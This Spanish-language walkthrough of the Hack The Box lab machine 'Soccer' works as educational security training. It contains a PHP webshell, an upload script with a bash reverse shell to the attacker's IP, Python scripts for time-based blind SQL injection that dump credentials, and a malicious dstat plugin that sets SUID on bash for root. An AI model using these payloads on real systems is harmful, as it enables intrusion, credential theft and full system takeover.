---
title: Soccer WriteUp
date: 2023-03-11 22:00:00 +0100
categories: [HTB, easy]
tags: [webshell,php,websockets,sqli blind, htb,linux]     # TAG names should always be lowercase
#image: /htb.jpg
#img_path: /photos/2023-01-02-Soccer-WriteUp/
published: true
---

***Soccer*** es una máquina *Linux* donde primeramente conseguiremos explotar el servicio *Tiny File Manager* subiendo una ***webshell*** en *PHP*. Siendo ***www-data*** descubriremos un **subdominio** que utiliza ***websockets***. Explotaremos un ***SQLI Blind Time Based*** para convertirnos en el usuario ***player***. Finalmente, nos ayudaremos de las herramientas ***dstat*** y ***doas*** para escalar privilegios y convertirnos en ***root***.

# Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="logo.png" alt="drawing" width="465"/>  
        </td>
        <td>
            <img src="stats.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>

# Reconocimiento 

## ping

Primero enviaremos un **ping** a la máquina víctima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a **64** significa que la máquina es ***Linux***. Por otra parte, un *TTL* menor o igual a **128** significa que la máquina es ***Windows***.

```bash
ping -c 1 10.10.11.194
PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
64 bytes from 10.10.11.194: icmp*seq=1 ttl=63 time=61.8 ms

--- 10.10.11.194 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 61.826/61.826/61.826/0.000 ms
```

Vemos que nos enfrentamos a una máquina ***Linux***, ya que su ***TTL*** es **63**.

## Port discovery

Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ***nmap***.

```bash
nmap -sS --min-rate 5000 -n -Pn -vvv -p- --open 10.10.11.194 -oG allPorts
Nmap scan report for 10.10.11.194
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no más lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**–open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero *allPorts* en este caso.

Una vez descubiertos los **puertos abiertos**, que en este caso son el **22, el 80 y el 9091**, lanzaremos una serie de ***scripts*** básicos de enumeración contra estos, en busca de los servicios que están corriendo y de sus versiones.

```python
nmap -sCV -p22,80,9091 10.10.11.194 -oN targeted
Nmap scan report for 10.10.11.194
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 02 Jan 2023 10:24:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 02 Jan 2023 10:24:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```

El puerto **22** es **SSH**, el puerto **80** **HTTP** y el **9091** puede que sea ***xmltec-xmlmail*** (no es seguro, *nmap* pone un interrogante). De momento, como no disponemos de credenciales para autenticarnos contra *SSH*, nos centraremos en auditar los puertos 80.

## Puerto 80 abierto (HTTP)

Gracias a los ***scripts*** de reconocimiento que lanza ***nmap***, podemos ver que el servicio web que corre en el puerto 80 nos redirige al dominio **soccer.htb**. Para que nuestra máquina pueda resolver a este dominio deberemos añadirlo al final de nuestro ***/etc/hosts***, de la forma:  

```bash
10.10.11.194 soccer.htb
```

### Tecnologías utilizadas

Primero utilizaremos ***whatweb*** para enumerar las tecnologías que corren detrás del servicio web. Nos encontramos con lo siguiente:

```python
whatweb 10.10.11.194
http://10.10.11.194 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], RedirectLocation[http://soccer.htb/], Title[301 Moved Permanently], nginx[1.18.0]
http://soccer.htb/ [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Nos hace el redireccionamiento que ya sabíamos a ***soccer.htb***. La web está usando *nginx 1.18.0* y versión de *jquery 3.2.1,3.6.0*.

### Fuzzing de directorios

Como en ***http://soccer.htb/*** no encontramos nada interesante, vamos a buscar directorios que se encuentren bajo el dominio de la máquina víctima.

Para el descubrimiento de directorios emplearé la herramienta ***wfuzz***. El comando será el siguiente:

```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://soccer.htb/FUZZ' -t 200
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                    
=====================================================================

000045227:   200        147 L    526 W      6917 Ch     "http://soccer.htb/"                                                                                                                       
000008021:   301        7 L      12 W       178 Ch      "tiny"   
```

**-c** es formato colorizado.  
**–hc=404** para esconder todas las repuestas 404 (No nos interesan, ya que son directorios que no existen). _hc_ viene de *hide code*.  
**-w** para especificar el diccionario que queremos emplear. Para *fuzzear* directorios yo casi siempre empleo el mismo, *directory-list-2.3-medium.txt*. Este diccionario se puede encontrar en el propio *Parrot OS* o en *Kali*. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-u** para especificar la *url*. La palabra *FUZZ* es un término de *wfuzz* y es donde se va a sustituir cada línea del diccionario.  
**-t 200** para indicar la cantidad de **hilos** a usar (ejecuciones paralelas). A más hilos más rápido pero menos fiable.

El único directorio interesante que encontramos es el directorio **tiny** que nos devuelve un 301. 

### Tiny File Manager

Del anterior volcado de *wfuzz*, encontramos el directorio ***tiny***: 

```bash
http://soccer.htb/tiny/
```

***Tiny File Manager*** es una aplicación web gratuita que permite gestionar y editar archivos y carpetas en tu servidor de forma sencilla a través de un navegador web. 

Al ingresar a la web lo único que vemos es un panel de *login*. Como no disponemos de credenciales, podemos ayudarnos de Google para buscar credenciales por defecto para esta aplicación. Encontramos las siguientes: ***admin:admin@123***.  Si las probamos, veremos que son **correctas**.

Como este aplicativo nos permite subir archivos y la web trabaja con *PHP*, podríamos intentar subir una ***webshell*** en *PHP* y que a través de un parámetro nos ejecute comandos. 

#  Consiguiendo shell como www-data 

En el archivo ***tinyfilemanager.php*** del directorio *tiny* podemos ver la configuración del servicio. Podemos encontrar las credenciales ***admin:admin@123*** y ***user:12345***.

## PHP file upload

En el directorio principal no tenemos permisos para subir archivos, pero en el directorio *tiny/uploads* sí que podremos. La ***webshell*** será:

```php
<?php
	system($_REQUEST['cmd'])
?>
```

La subimos:

![imagen 1](imga1.png)

Al hacer clic en el archivo y luego a *open*, podremos ejecutar comandos a través del parámetro ***cmd***:

![imagen 2](image2.png)

En este caso, he ejecutado ***whoami*** a través del parámetro ***cmd***. El siguiente *script* automatiza la subida del archivo y la ejecución de un payload, que envía por el puerto *443* una *reverse shell*:

```python
#!/usr/bin/python3

import signal,requests,sys

#Ctrl+C
def defhandler():
    print("[*] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,defhandler)

#Variables globales 
url="http://soccer.htb/tiny/"
burp = {'http': 'http://localhost:8080'}

def login():
    urlLogin = url + "tinyfilemanager.php?p=tiny%2Fuploads"

    headers = {
        "Cookie": "filemanager=gmtimk86nahp3klphn54427m2u"
    }

    data = {
        "fm_usr":"admin",
        "fm_pwd":"admin@123"
    }

    requests.post(urlLogin, headers=headers, data=data)
	
def rce():
    urlUpload =url + "tinyfilemanager.php?p=tiny/uploads"
    headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryc2w6QHu2wMC6QJV3",
        "Cookie": "filemanager=gmtimk86nahp3klphn54427m2u"
    }

    data = """
------WebKitFormBoundaryc2w6QHu2wMC6QJV3
Content-Disposition: form-data; name="p"

tiny/uploads
------WebKitFormBoundaryc2w6QHu2wMC6QJV3
Content-Disposition: form-data; name="fullpath"

shell.php
------WebKitFormBoundaryc2w6QHu2wMC6QJV3
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php 
        system('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'); 
?>

------WebKitFormBoundaryc2w6QHu2wMC6QJV3--
"""

    requests.post(urlUpload, headers=headers, data=data)
    requests.get(url + 'uploads/shell.php')
    
if __name__ == '__main__':
    login()
    rce()
```

Podemos utilizar el ***script*** anterior o bien utilizar la webshell que habíamos subido para obtener una reverse shell. En ambos casos, nos tendremos que poner en escucha con netcat:

```bash
nc -nlvp 443
```

Recibiremos una shell como ***www-data***.

Una vez recibida la shell, deberemos hacerle un **tratamiento** para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas… Los comandos que ingresaremos serán:

```bash
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos ajustar el número de filas y de columnas de esta _shell_. Con el comando ***stty size*** podemos consultar nuestras filas y columnas y con el comando ***stty rows \<rows\> cols \<cols\>*** podemos ajustar estos campos.

Ahora deberemos escalar privilegios para convertirnos en el usuario ***player***.

#  Consiguiendo shell el usuario player 

## Reconocimiento como www-data 

### Descubrimiento del subdominio soc-player.soccer.htb

Como sabemos que se estaba utilizando *nginx* para correr el sitio web, una ruta interesante para ver la configuración de los dominios es ***/etc/nginx/sites-avaliable***. Cada archivo de configuración en este directorio representa un sitio web configurado en el servidor Nginx. Dentro de este directorio encontramos un archivo llamado *soc_player.htb*:

```bash
bash-5.0$ ls /etc/nginx/sites-available/
default         soc-player.htb  
```

Si listamos su contenido:

```bash
bash-5.0$ cat /etc/nginx/sites-available/soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}
}
```

Encontramos el subdominio ***soc-player*** del dominio *soccer.htb*. Podemos añadirlo a nuestro */etc/hosts* y ver que contiene este sitio web. Nuestro archivo hosts quedaría de la siguiente manera: 

```bash
10.10.11.194 soccer.htb soc-player.soccer.htb
```

### Analizando http://soc-player.soccer.htb

La página web que vemos es bastante parecida a ***http://soccer.htb*** pero ahora con unos cuantos botones más. Podemos hacernos una cuenta e iniciar sesión.

![imagen 3](image3.png)

Al iniciar sesión, nos encontramos con esta especie de panel. Nos está pidiendo un número. Podemos interceptar la petición con ***Burpsuite*** para ver lo que se está tramitando por detrás.

Lo que interceptamos es lo siguiente:
![imagen 4](image4.png)

***WebSockets*** es un protocolo de red que permite la comunicación bidireccional en tiempo real entre un cliente y un servidor a través de una conexión TCP. En este caso, se está estableciendo la conexión contra ***http://soc-player.soccer.htb:9091/***. Recordemos que en la fase de reconocimiento vimos este puerto abierto, pero no sabíamos al 100% el servicio que estaba corriendo.

Podemos enviar la petición al *Repeater* y ***fuzzear*** el input en busca de comportamientos extraños.

Después de probar con multitud de *payloads*, vemos que el campo de input es **vulnerable a SQLI Blind**.

## SQLI blind time based

***SQL Injection Blind (SQLI Blind)*** es un tipo de ataque de inyección de SQL que se utiliza para explotar vulnerabilidades en una aplicación web. Se llama *blind* (ciego) porque el atacante no recibe una respuesta directa del servidor como resultado de su ataque.

En este caso, si empleamos el payload:

```python
{"id":"1 or sleep(5)"}
```

el servidor tardará 5 segundos en respondernos, pero no nos dará ningún tipo de error. Por eso mismo, el ***SQLI*** tradicional (*Error Based*) no funcionaría, ya que en este nos basamos en el error para volcar la información de la base de datos.

La imagen de abajo es una foto del *Repeater* con el *payload* malicioso en la izquierda y en la derecha la respuesta del servidor:

![imagen 5](image5.png)

En este punto que ya sabemos que es vulnerable a este tipo de ataque, podemos aprovecharnos del tiempo para **volcar toda la información de la base de datos**. Usaremos *python3* para desarrollar los *scripts*.

### Base de datos en uso

Como se está utilizando ***web sockets***, la forma de operar será diferente en cuanto a desarrollo de *scripts* se refiere. En este caso, deberemos definir una función asíncrona que se encargara de enviar el *input* a *ws://soc-player.soccer.htb:9091/*. 

Utilizaremos el siguiente ***payload*** para volcar la base de datos en uso:

```python
"{"id":"1 or if(substr((database()),{position},1)='{letter}',sleep(2),1)}"
```

***{position}*** y ***{letter}*** son dos variables que forman parte de un doble bucle anidado. ***{position}*** se utilizará para iterar por cada posición del nombre de la base de datos en uso y ***{letter}*** para iterar por cada letra por cada posición de la base de datos actual. ***database()*** es una directiva de MySQL que contiene el nombre de la base de datos actual. 

Por tanto, si una letra en una posición concreta es correcta (la sentencia *if* se cumple), el servidor tardará en este caso 2 segundos en responder (***sleep(2)***). 

A continuación dejo el script:

```python
import asyncio
import websockets
import signal,sys,string,time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales
letters = string.ascii_lowercase
burp = {'http':'http://127.0.0.1:8080'}
bbdd = ""
let = ""

async def send_request(request):
    async with websockets.connect('ws://soc-player.soccer.htb:9091/') as websocket:
        await websocket.send(request)
        inicio = time.time()
        response = await websocket.recv()
        fin = time.time()
        response = False
        if fin - inicio >= 2:
            global bbdd
            global let
            bbdd += let
            p2.status(bbdd)
            response = True

        return response

def peticion(request):
    response = asyncio.get_event_loop().run_until_complete(send_request(request))
    return response

if __name__ == "__main__":

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("BBDD: ")
    time.sleep(2)
    for position in range(1,65):
        for letter in letters:
            let = letter
            payload = f"or if(substr((database()),{position},1)=\'{letter}\',sleep(2),1)"
            request = "{\"id\":\"1 "+payload+"\"}"
            p1.status(request)
            response = peticion(request)
            if response:
                break
```

Si ejecutamos el *script* y esperemos un poco:

```bash
python3 prueba.py 
[°] SQLI: {"id":"1 or if(substr((database()),8,1)='d',sleep(2),1)"}
[v] BBDD: : soccer_db
[!] Saliendo...
```

La base de datos en uso es ***soccer_db***.

### Bases de datos existentes

Para volcar todas las **bases de datos** la *query* será la siguiente:

```python
"{"id":"1 or if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{letter}',sleep(2),1)}"
```

La lógica es exactamente la misma que en el caso anterior, pero ahora, se utiliza ***schema_name) from information_schema.schemata*** para volcar las *databases*. ***group_contat*** sirve para concatenar todas las bases de datos en una misma línea, separadas por comas.

A continuación dejo el ***script***:      

```python
import asyncio
import websockets
import signal,sys,string,time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales
letters = string.ascii_lowercase + string.punctuation
burp = {'http':'http://127.0.0.1:8080'}
databases = ""
let = ""

async def send_request(request):
    async with websockets.connect('ws://soc-player.soccer.htb:9091/') as websocket:
        await websocket.send(request)
        inicio = time.time()
        response = await websocket.recv()
        fin = time.time()
        response = False
        if fin - inicio >= 2:
            response = True
            global databases
            global let
            databases += let
            p2.status(databases)
        return response

def peticion(request):
    response= asyncio.get_event_loop().run_until_complete(send_request(request))
    return response

if __name__ == "__main__":

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("databases: ")
    time.sleep(2)
    for position in range(1,100):
        for letter in letters:
            let = letter
            payload = f"or if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)=\'{letter}\',sleep(2),1)"
            request = "{\"id\":\"1 "+payload+"\"}"
            p1.status(request)
            response = peticion(request)
            if response:
                break
```

Esperado un tiempo, obtenemos las siguientes bases de datos:

```bash
python3 tables.py
[∧] databases: : mysql,information_schema,performance_schema,sys,soccer_db
```

* mysql
* information_schema
* performance_schema
* sys
* soccer_db

Las 4 primeras suelen ser bases de datos por defecto de MySQL, por lo que no son relevantes. Por lo tanto, nos centraremos en ***soccer_db***.

### Tablas de la base de datos *soccer_db*

Para listar las **tablas** de *soccer_db*, utilizaremos el siguiente payload:

```python
"{"id":"1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),{position},1)=\'{letter}\',sleep(2),1)}"
```

El ***script*** es el siguiente:

```python
import asyncio
import websockets
import signal,sys,string,time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales
letters = string.ascii_lowercase + string.punctuation
burp = {'http':'http://127.0.0.1:8080'}
tables = ""
let = ""

async def send_request(request):
    async with websockets.connect('ws://soc-player.soccer.htb:9091/') as websocket:
        await websocket.send(request)
        inicio = time.time()
        response = await websocket.recv()
        fin = time.time()
        response = False
        if fin - inicio >= 2:
            response = True
            global tables
            global let
            tables += let
            p2.status(tables)
        return response

def peticion(request):
    response= asyncio.get_event_loop().run_until_complete(send_request(request))
    return response

if __name__ == "__main__":

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Tables: ")
    time.sleep(2)
    for position in range(1,100):
        for letter in letters:
            let = letter
            payload = f"or if(substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),{position},1)=\'{letter}\',sleep(2),1)"
            request = "{\"id\":\"1 "+payload+"\"}"
            p1.status(request)
            response = peticion(request)
            if response:
                break
```

Al cabo de un rato descubriremos:

```bash
 python3 tables.py 
[◤] SQLI: {"id":"1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema='soccer_db'),12,1)='l',sleep(2),1)"}
[|] Tables: : accounts
```

En la base de datos soccer_db solo existe la tabla ***accounts***.

### Columnas de la tabla *accounts*

Ahora listaremos todas las **columnas** de la tabla accounts. Deberíamos de encontrar dos columnas que hicieran alusión al nombre de **usuario** y **contraseña**.

La query es la siguiente:

```python
"{"id":"1 or if(substr((select group_concat(column_name) from information_schema.columns where table_name='accounts'),{position},1)='{letter}',sleep(2),1)}"
```

***Script***:

```python
import asyncio
import websockets
import signal,sys,string,time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales
letters = string.ascii_lowercase + string.punctuation
burp = {'http':'http://127.0.0.1:8080'}
columns = ""
let = ""

async def send_request(request):
    async with websockets.connect('ws://soc-player.soccer.htb:9091/') as websocket:
        await websocket.send(request)
        inicio = time.time()
        response = await websocket.recv()
        fin = time.time()
        response = False
        if fin - inicio >= 2:
            response = True
            global columns
            global let
            columns += let
            p2.status(columns)
        return response

def peticion(request):
    response= asyncio.get_event_loop().run_until_complete(send_request(request))
    return response

if __name__ == "__main__":

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Columns: ")
    time.sleep(2)
    for position in range(1,200):
        for letter in letters:
            let = letter
            payload = f"or if(substr((select group_concat(column_name) from information_schema.columns where table_name='accounts'),{position},1)=\'{letter}\',sleep(2),1)"
            request = "{\"id\":\"1 "+payload+"\"}"
            p1.status(request)
            response = peticion(request)
            if response:
                break
```

Después de un buen rato, obtenemos el siguiente resultado:

```bash
python3 tables.py 
[▇] SQLI: {"id":"1 or if(substr((select group_concat(column_name) from information_schema.columns where table_name='accounts'),99,1)='m',sleep(2),1)"}
[█] Columns: user,host,current_connections,total_connections,max_session_controlled_memory,max_session_total_memory,id,email,username,password
```

Las columnas encontradas son:

* user
* host
* current_connections
* total_connections
* max_session_controlled_memory
* max_session_total_memory
* id
* email
* username
* password

Ya para finalizar, podemos intentar volcar la información contenida en las columnas ***username*** y ***password***.

### Usuarios y contraseñas


Por último, ***dumpearemos*** la información de las columnas *username* y *password*:

```python
"{"id":"1 or if(ord(substr((select group_concat(username,0x3a,password) from accounts),{position},1))=ord(\'{letter}\'),sleep(4),1)}"
```

***group_concat(username,0x3a,password)*** sirve para concatenar el usuario y la contraseña separados por dos puntos (0x3a). Como la base de datos actual es *soccer_db* podemos especificar la tabla directamente sin tener que poder *soccer_db.accounts*. Además, se ha utilizado la directiva ***ord*** para diferenciar entre mayúsculas y minúsculas, ya que MySQL es *case insensitive* y podríamos tener problemas al obtener la información deseada.


```python
import asyncio
import websockets
import signal,sys,string,time
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales
letters = string.printable
burp = {'http':'http://127.0.0.1:8080'}
info = ""
let = ""

async def send_request(request):
    async with websockets.connect('ws://soc-player.soccer.htb:9091/') as websocket:
        await websocket.send(request)
        inicio = time.time()
        response = await websocket.recv()
        fin = time.time()
        response = False
        if fin - inicio >= 4:
            response = True
            global info
            global let
            info += let
            p2.status(info)
        return response

def peticion(request):
    response= asyncio.get_event_loop().run_until_complete(send_request(request))
    return response

if __name__ == "__main__":

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Info: ")
    time.sleep(2)
    for position in range(1,200):
        for letter in letters:
            let = letter
            payload = f"or if(ord(substr((select group_concat(username,0x3a,password) from accounts),{position},1))=ord(\'{letter}\'),sleep(4),1)"
            request = "{\"id\":\"1 "+payload+"\"}"
            p1.status(request)
            response = peticion(request)
            if response:
                break
```

Ejecutamos el script:

```bash
python3 tables.py 
[ ] SQLI: {"id":"1 or if(substr((select group_concat(username,0x3a,password) from accounts),35,1)='c',sleep(2),1)"}
[\] Info: : player:PlayerOftheMatch2022
```

Y encontraremos las credenciales ***player:PlayerOftheMatch2022***

### user.txt

Nos podemos conectar a través de ***SSH***, o bien a través de la consola ganada anteriormente como *www-data*. En el ***homedir*** de *player* encontraremos la primera *flag*:

```bash
player@soccer:~$ cat user.txt 
acf4b8ef3efeabcc450fa51ae116bdcf
```
#  Consiguiendo shell como root

## Reconocimiento del sistema como player

Empezaremos enumerando todos aquellos archivos que tengan permiso ***suid***:

```bash
player@soccer:/tmp$ find / -perm -4000 2>/dev/null -ls
    70968     44 -rwsr-xr-x   1 root     root        42224 Nov 17 09:09 /usr/local/bin/doas
     1753     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount
     2093     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
     1752     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount
     1647     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su
     ...
```

Un fichero inusual es con permisos *suid* es */usr/local/bin/**doas***. 

*doas* es un programa de línea de comandos que permite a los usuarios ejecutar comandos con **privilegios de superusuario** en un sistema operativo. Es similar a *sudo*, pero tiene una sintaxis ligeramente diferente y se enfoca en ser una herramienta más ligera y segura. Ahora bien, cualquier tipo de comando que intentemos ejecutar, del tipo ***doas \<comando\>***, no nos dejará.

También podemos enumerar archivos cuyo propietario o grupo seamos nosotros. Para enumerar archivos cuyo **grupo** sea ***player*** podemos ejecutar:

```bash
player@soccer:/tmp$ find / -group player 2>/dev/null -ls | grep -vE "home|proc|run|sys" 
   520971      4 drwxrwx---   2 root     player       4096 Dec 12 /usr/local/share/dstat
    48638      4 drwx------   2 player   player       4096 Jan  2 16:50 /tmp/tmux-1001
```

Encontramos que tenemos todos los permisos (rwx) en el directorio ***/usr/local/share/dstat***. 
*grep -vE* es para quitar ruido de rutas poco interesantes.

### Reconocimiento con LinPEAS


***LinPEAS*** es un script de *bash* que se utiliza para recopilar información sobre la configuración y la seguridad de un sistema operativo. Se puede utilizar para hacer un análisis de seguridad de un sistema y para identificar posibles vulnerabilidades. Lo podemos descargar de [aquí](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) y luego transportarlo a la máquina víctima compartiéndonos el binario con un servidor de python (***python3 -m http.server 80***) y descargándolo con ***wget***.

Algo interesante que nos muestra es lo siguiente:

```bash
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

El archivo */usr/local/doas/doas.conf* se ha configurado para que podemos ejecutar como el usuario ***root*** el comando */usr/bin/**dstat***. 

### dstat 

***dstat*** es una herramienta de monitoreo de rendimiento para sistemas operativos basados en Unix. Permite a los usuarios ver información en tiempo real sobre el rendimiento del sistema, incluyendo el uso de la CPU, la memoria, el disco y la red.

El output de la herramienta es el siguiente:

```bash
player@soccer:/tmp$ doas /usr/bin/dstat 
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
  1   1  98   0   0| 214k   58k|   0     0 |   0     0 | 297   577 
  1   0  99   0   0|   0     0 | 198B  790B|   0     0 | 243   478 
  0   0 100   0   0|   0     0 |  66B  342B|   0     0 | 242   474 
  0   0  99   0   0|   0     0 |  66B  342B|   0     0 | 241   483 
  0   0 100   0   0|   0     0 | 126B  384B|   0     0 | 250   491
```

***dstat*** ofrece la posibilidad de utiizar ***plugins***. Los *plugins* son módulos que se pueden cargar en *dstat* para proporcionar información adicional sobre el rendimiento del sistema. Nosotros, en cambio, los podemos utilizar para crear un script malicioso, que al ser ejecutado por *root*, lleve a cabo una acción de *superusuario* en el sistema. *dstat* ofrece el parámetro *--list* para listar los *plugins* disponibles y *--\<plugin-name\>* para seleccionar uno:

```bash
player@soccer:/tmp$ dstat --help
...
 --list                   list all available plugins
  --<plugin-name>          enable external plugin by name (see --list)
...
```

Si miramos el [manual](https://linux.die.net/man/1/dstat), podemos ver los directorios donde se pueden alojar los *plugins*. Estos son:
* ~/.dstat/
* (path of binary)/plugins/
* /usr/share/dstat/
* ***/usr/local/share/dstat/***

En este último directorio recordemos que tenemos todos los permisos, ya que el grupo del directorio era *player*. Solo nos falta saber cual es la estructura de un plugin de *dstat*. Si listamos el contenido de */usr/share/dstat/* podemos ver que el formato es ***dstat_\<nombre_plugin\>.py***:

```bash
player@soccer:/tmp$ cat /usr/share/dstat/              
dstat_fan.py                  dstat_mongodb_opcount.py      dstat_nfsd4_ops.py            dstat_snooze.py               dstat_top_oom.py
dstat.py                      dstat_freespace.py
```
## Explotación de doas y dstat

En este punto, vamos a construirnos un *script* en *python* ***dstat_pwned.py*** que al ser ejecutado por *root* dé permisos *suid* a la *bash*:

```bash
player@soccer:/tmp$ cat /usr/local/share/dstat/dstat_pwned.py 
import os
os.system('chmod u+s /bin/bash')
```

Ejecutaremos ***dstat*** con el comando:

```bash
player@soccer:/tmp$ doas /usr/bin/dstat --pwned
```

y ya podremos *spawnearnos* una ***shell*** como el usuario ***root***:

```bash
player@soccer:/tmp$ bash -p 
bash-5.0# whoami
root
```
## root.txt

En el ***homedir*** de *root* encontraremos la segunda ***flag***:

```bash
bash-5.0# cat /root/root.txt 
0bbe8baea96c4f28867887bfdda9b16b
```